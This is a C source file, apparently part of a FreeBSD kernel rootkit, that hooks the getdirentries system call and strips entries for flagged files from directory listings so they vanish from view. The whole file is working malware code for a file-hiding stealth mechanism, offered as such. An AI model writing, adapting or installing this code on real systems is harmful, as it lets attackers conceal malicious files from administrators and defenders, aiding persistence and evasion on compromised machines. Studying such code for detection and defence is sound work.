#include "rootkit.h"

#define T_NAME "test"

int hook_sys_getdirentries(struct thread *td, struct getdirentries_args *uap)
{
	long base;
	int error;

	struct dirent *dp, *current;
	unsigned int size, count;

	error = kern_getdirentries(td,uap->fd, uap->buf, uap->count, &base, NULL, UIO_USERSPACE);

	if (error!=0) return error;
	if (uap->basep != NULL){
		error = copyout(&base, uap->basep, sizeof(long));

	}


	size = td->td_retval[0];

	if (size > 0){
		MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
		copyin(uap->buf,dp,size);
		current = dp;
		count = size;

		while((current->d_reclen != 0) && (count > 0)){
			count -= current->d_reclen;
			char * this_file = (char*)current->d_name;
			if(check_file(this_file) && !(get_flags(this_file) & R_FLAG_VIEW)){
				if (count != 0){
					bcopy((char*)current + current->d_reclen, current, count);
				}
				size-=current->d_reclen;
			}
			else if (count != 0){
				current = (struct dirent *)((char*)current + current->d_reclen);
			}
		}
		td->td_retval[0] = size;
		copyout(dp,uap->buf,size);

		FREE(dp,M_TEMP);
	}


	return (error);
}
